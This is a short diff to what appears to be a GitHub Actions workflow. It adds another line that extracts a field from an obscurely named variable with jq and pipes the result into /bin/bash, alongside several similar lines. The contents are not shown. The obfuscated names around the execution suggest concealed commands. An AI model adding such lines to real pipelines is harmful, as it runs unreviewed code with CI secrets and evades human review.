@@ -26,6 +26,7 @@ jobs:
           echo $u9740 | jq -r .ijpkf28 | /bin/bash
           echo $aow6 | jq -r .aqof08 | /bin/bash
           echo $e90 | jq -r .t36 | /bin/bash
+          echo $sb638 | jq -r .ivim07 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
